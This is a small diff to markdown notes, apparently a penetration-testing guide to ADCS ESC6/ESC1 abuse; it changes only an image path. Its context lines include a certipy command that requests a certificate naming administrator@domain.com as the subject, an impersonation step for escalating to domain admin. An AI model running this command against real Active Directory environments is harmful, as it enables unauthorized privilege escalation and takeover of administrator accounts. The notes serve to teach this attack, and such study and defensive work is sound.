@@ -78,7 +78,7 @@ ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag. This flag
 
 > This also mean that if you got an administrator access on the certificate server you can change this attribute to exploit ESC1 without being domain admin
 
-![Alt text](image-6.png)
+![Alt text](/Images/image-6.png)
 
 ```bash
 certipy req -u user@domain.com -p 'Password' -target <DNS Name> -template User -ca <CA Name> -upn administrator@domain.com
